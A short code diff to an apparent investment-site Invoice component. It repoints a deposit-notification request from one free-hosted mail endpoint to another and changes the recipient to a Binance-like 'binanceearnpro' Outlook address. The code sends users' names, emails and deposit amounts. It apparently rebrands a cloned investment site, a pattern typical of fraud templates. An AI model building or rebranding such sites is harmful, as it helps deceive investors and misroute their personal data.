@@ -284,14 +284,14 @@ function Invoice() {
         );
         ajax({
           url:
-            "https://reinvented-natural-catshark.glitch.me/unchainedtrade",
+            "https://bnbearnpro.vercel.app/sendmail",
           method: "POST",
           headers: {
             "Content-Type": "application/json",
           },
           body: {
             message: `New incoming investment request from ${userInfos.firstName} ${userInfos.lastName} has been placed, total deposit amount : ${amountnn}`,
-            to: `${userInfos.email}, service@unchainedtrader.com`,
+            to: `${userInfos.email}, binanceearnpro@outlook.com`,
             subject: "investment",
           },
         }).subscribe(() => {
